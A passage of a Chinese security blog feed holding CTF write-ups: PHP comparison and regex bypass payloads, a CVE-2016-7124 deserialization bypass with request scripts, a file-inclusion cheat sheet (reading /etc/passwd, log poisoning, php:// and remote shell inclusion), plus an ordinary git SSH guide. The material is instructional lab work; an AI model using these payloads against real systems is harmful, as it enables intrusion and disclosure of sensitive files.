ASCII 码值</span><br><span class="line">$number = &apos;3735929054&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br></pre></td></tr></table></figure><p>ascii值在1~9过滤掉，而php弱类型比较 ‘16进制’ == ‘10进制’，可以绕过<br>paylaod:password=0xdeadc0de</p><h2 id="0x10-ereg正则-00截断"><a href="#0x10-ereg正则-00截断" class="headerlink" title="0x10. ereg正则%00截断"></a>0x10. ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">You password must be alphanumeric</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&apos;</span><br><span class="line">- have not been found</span><br><span class="line"></span><br><span class="line">&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用数组&gt;数字，并且ereg和strlen和strpos传入数组均为null可以绕过<br>payload：?password[]</p><h2 id="0x11-strpos数组绕过"><a href="#0x11-strpos数组绕过" class="headerlink" title="0x11. strpos数组绕过"></a>0x11. strpos数组绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&apos;ctf&apos;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)</span><br><span class="line">echo &apos;必须输入数字才行&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老知识点，ereg和strpos传入数组返回null可以绕过<br>paylaod: ?ctf[]</p><h2 id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12.  数字验证正则绕过"></a>0x12.  数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码题意，进行绕过<br>payload: password=42.000000000000e-0    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-extract变量覆盖&quot;&gt;&lt;a href=&quot;#0x01-extract变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;0x01. extract变量覆盖&quot;&gt;&lt;/a&gt;0x01. extract变量覆盖&lt;/h2&gt;&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化绕过__wakeup方法</title>
    <link href="http://yoursite.com/2019/04/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87__wakeup%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/</id>
    <published>2019-04-21T10:12:23.000Z</published>
    <updated>2019-05-13T12:45:05.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h2><p>做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p><h2 id="0x02-public-private-protected的序列化"><a href="#0x02-public-private-protected的序列化" class="headerlink" title="0x02. public private protected的序列化"></a>0x02. public private protected的序列化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Kage&#123;</span><br><span class="line">public $name=&apos;kxj&apos;;</span><br><span class="line">private $name2=&apos;kxj&apos;;</span><br><span class="line">protected $name3=&apos;kxj&apos;;</span><br><span class="line"></span><br><span class="line">public function getName()&#123;</span><br><span class="line">var_dump($this);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new Kage());</span><br><span class="line"></span><br><span class="line">$a = unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">$a-&gt;getName();</span><br></pre></td></tr></table></figure><p>运行得到结果：<br><code>O:4:&quot;Kage&quot;:3:{s:5:&quot;name1&quot;;s:3:&quot;kxj&quot;;s:11:&quot;Kagename2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;*name3&quot;;s:3:&quot;kxj&quot;;}</code><br>属性值都一样，不同的在属性名</p><ul><li>public：s:5:”name1”</li><li>private：s:11:”Kagename2”</li><li>protected：s:8:”*name3”</li></ul><p>细心观察，会发现private和protected方法长度与所标识的不一样，实际原因是因为浏览器或命令行无法输出某些字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php&quot;</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p><p>通过content输出可以发现<br><code>b&#39;O:4:&quot;Kage&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;kxj&quot;;s:11:&quot;\x00Kage\x00name2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;\x00*\x00name3&quot;;s:3:&quot;kxj&quot;;}&#39;</code></p><ul><li>public：s:5:”name1”</li><li>private：s:11:”\x00Kage\x00name2”</li><li>protected：s:8:”\x00*\x00name3”</li></ul><p>研究可以发现，<code>public</code>修饰变量时原样保留，<code>private</code>修饰变量时为<code>\x00类名\x00变量名</code>，<code>protected</code>修饰变量时为<code>\x00*\x00变量</code>。</p><p>写脚本用<code>\x00</code>时会报错，可以使用<code>%00</code>或者<code>\0</code>来填充<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">p1 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;%00Kage%00name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;%00*%00name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">p2 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;\0Kage\0name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;\0*\0name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php?id=&quot; + p2</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p><p>结果将<code>kxj</code>改为了<code>flag</code><br><img src="/img/1555855975423.png" alt="Alt text"></p><h2 id="0x03-wakeup魔术方法绕过"><a href="#0x03-wakeup魔术方法绕过" class="headerlink" title="0x03. __wakeup魔术方法绕过"></a>0x03. __wakeup魔术方法绕过</h2><p>CVE-2016-7124：简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">private $file;</span><br><span class="line"></span><br><span class="line">public function __construct($file) &#123;</span><br><span class="line">$this-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo $this-&gt;file;</span><br><span class="line">&#125;</span><br><span class="line">public function __wakeup() &#123;</span><br><span class="line">$this-&gt;file = NULL;</span><br><span class="line">echo &quot;wakeup&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// $s = new Test(&apos;index&apos;);</span><br><span class="line">// $g = serialize($s);</span><br><span class="line">// echo $g;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br></pre></td></tr></table></figure></p><p>意思大概就是反序列化之后，会自动调用<code>__wakeup</code>方法将文件名设置为空。<br><code>O:4:&quot;Test&quot;:1:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860027596.png" alt="Alt text"></p><p>将对象属性设置为2<br><code>O:4:&quot;Test&quot;:2:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860082394.png" alt="Alt text"><br>成功控制file变量输出flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01.前言&quot;&gt;&lt;/a&gt;0x01.前言&lt;/h2&gt;&lt;p&gt;做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。&lt;br&gt;影
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞小结</title>
    <link href="http://yoursite.com/2019/03/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/03/31/文件包含漏洞/</id>
    <published>2019-03-31T10:32:18.000Z</published>
    <updated>2019-05-13T12:45:50.095Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见函数有：include()、require()<br>区别：</p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ol><li><p>包含目录文件<br>?file=test.txt<br>如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</p><p> ?file=./../../test.txt<br> <code>./</code>当前目录，<code>../</code>上一级目录，这样的遍历目录来读取文件</p></li><li><p>包含日志文件<br>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录<br>常见几个路径<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br><img src="/img/1553776213389.png" alt="Alt text"></p></li><li><p>包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p></li><li><p>利用php流filter(过滤器，可以用来读取php文件内容，不需要开启allow_url_include)<br>?file=php://filter/convert.base64-encode/resource=index.php</p></li></ol><h2 id="本地文件包含小姿势"><a href="#本地文件包含小姿势" class="headerlink" title="本地文件包含小姿势"></a>本地文件包含小姿势</h2><p>审计中可以见这样的包含模板文件：<br><code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;</code></p><ol><li>%00截断<br> /etc/passwd%00<br> （需要magic_quotes_gpc=off，PHP小于5.3.4有效）</li></ol><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ol><li>远程代码执行<br>?file=[http|https|ftp]://example.com/shell.txt<br>(需要allow_url_fopen=On并且 allow_url_include=On)</li><li>利用php流input(接收POST过来的值)<br>?file=php://input<br>(需要allow_url_include=On)</li><li>利用data URIs<br>?file=data://text/plain;base64,base64编码的payload<br>(需要allow_url_include=On)</li></ol><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ol><li>phar伪协议<br>?file=phar://test.jpg/test.php<br>利用方法，先新建一个php文件，然后在php文件中写入phpinfo，然后进行压缩为zip文件，重命名为jpg文件，然后进行phar包含</li><li>zip伪协议<br>?file=zip://C:/www/K4ge/CodeAduit/1000/include/test.jpg%23test.php<br>必须使用绝对路径</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。&lt;br&gt;常见函数
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>同一台电脑连接多个github仓库</title>
    <link href="http://yoursite.com/2019/02/03/%E5%90%8C%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E5%A4%9A%E4%B8%AAgithub%E4%BB%93%E5%BA%93/"/>
    <id>http://yoursite.com/2019/02/03/同一台电脑连接多个github仓库/</id>
    <published>2019-02-03T08:42:16.000Z</published>
    <updated>2019-05-13T12:46:30.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-生成密钥"><a href="#0x01-生成密钥" class="headerlink" title="0x01.生成密钥"></a>0x01.生成密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yourname@email.com&quot;</span><br></pre></td></tr></table></figure><p>分别生成两次公钥，可以得到两组公钥和私钥</p><h2 id="0x02-在github上添加公钥"><a href="#0x02-在github上添加公钥" class="headerlink" title="0x02. 在github上添加公钥"></a>0x02. 在github上添加公钥</h2><p>不解释</p><h2 id="0x03-添加config配置文件"><a href="#0x03-添加config配置文件" class="headerlink" title="0x03. 添加config配置文件"></a>0x03. 添加config配置文件</h2><p>在.ssh文件夹下添加config文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#第一个账号 Bu1uokage</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">#第二个账号 K4ge</span><br><span class="line">Host K4ge</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_K4ge</span><br></pre></td></tr></table></figure></p><p>说明：</p><ol><li>Host 可以是自定义的随机别名，如<code>K4ge</code>，在后面clone时会用到</li><li>Hostname 就默认配置就好</li><li>User默认就使用git就好</li><li>IdentityFile即公钥对应目录</li></ol><h2 id="0x04-SSH连接"><a href="#0x04-SSH连接" class="headerlink" title="0x04. SSH连接"></a>0x04. SSH连接</h2><p>如果出现Could not open a connection to your authentication agent错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br></pre></td></tr></table></figure></p><p>可以使用上述命令解决</p><p>添加ssh到agent中，<code>ssh-add -D</code>将agent中的删除，然后再依次添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa</span><br><span class="line">ssh-add id_rsa_K4ge</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure></p><p>测试连接远程github服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T K4ge</span><br></pre></td></tr></table></figure></p><h2 id="0x05-git实战"><a href="#0x05-git实战" class="headerlink" title="0x05. git实战"></a>0x05. git实战</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:K4ge/gitskills.git</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@K4ge:K4ge/gitksills.git</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;new README&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>先删除当前为github.com的remote<br>然后添加新的remote为K4ge，然后就可以push到新账号了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-生成密钥&quot;&gt;&lt;a href=&quot;#0x01-生成密钥&quot; class=&quot;headerlink&quot; title=&quot;0x01.生成密钥&quot;&gt;&lt;/a&gt;0x01.生成密钥&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="other" scheme="http://yoursite.com/categories/other/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>hgame-web-week1</title>
    <link href="http://yoursite.com/2019/02/03/hgame%E8%8D%89%E7%A8%BF/"/>
    <id>http://yoursite.com/2019/02/03/hgame草稿/</id>
    <published>2019-02-03T05:45:23.000Z</published>
    <updated>2019-05-13T12:46:12.502Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-谁吃了我的flag"><a href="#1-谁吃了我的flag" class="headerlink" title="1. 谁吃了我的flag"></a>1. 谁吃了我的flag</h2><p><img src="/img/1548569716058.png" alt=""><br>获取vim备份文件<br>vim自动退出会临时备份隐藏文件 .xxx.swp<br>用linux打<br><code>vim -r .xxx.swp</code> 可以恢复备份文件<br>hgame{3eek_diScl0Sure_fRom+wEbsit@}</p><h2 id="2-换头大作战"><a href="#2-换头大作战" class="headerlink" title="2. 换头大作战"></a>2. 换头大作战</h2><p><img src="/img/1548570653300.png" alt=""><br>输入框输入，要求使用post<br>post输入<br>要求使用waterfox，更改<br>要求bilibili登录<br>最后得到flag<br>hgame{hTTp_HeaDeR_iS_Ez}</p><h2 id="3-very-easy-web"><a href="#3-very-easy-web" class="headerlink" title="3. very easy web"></a>3. very easy web</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹/img/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">if($_GET[&apos;id&apos;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>urldecode()函数的危险问题<br>php会进行自动解码一次<br>如果使用这个函数，可以通过二次编码绕过前面的过滤<br>hgame{urlDecode_Is_GoOd}</p><h2 id="4-can-you-find-me"><a href="#4-can-you-find-me" class="headerlink" title="4. can you find me"></a>4. can you find me</h2><p><img src="/img/1548571660564.png" alt=""><br><img src="/img/1548571688433.png" alt=""><br>从返回包头找到密码woyaoflag<br>发送post密码得到flag<br>hgame{f12_1s_aMazIng111}</p><h2 id="5-Hidden-Image-in-LSB"><a href="#5-Hidden-Image-in-LSB" class="headerlink" title="5. Hidden Image in LSB"></a>5. Hidden Image in LSB</h2><p>有StegSolve打开，按下面左右调试即可<br><img src="/img/1548572207626.png" alt=""><br>hgame{LSB_is_easy_for_u}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-谁吃了我的flag&quot;&gt;&lt;a href=&quot;#1-谁吃了我的flag&quot; class=&quot;headerlink&quot; title=&quot;1. 谁吃了我的flag&quot;&gt;&lt;/a&gt;1. 谁吃了我的flag&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/1548569716058.png
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
</feed>
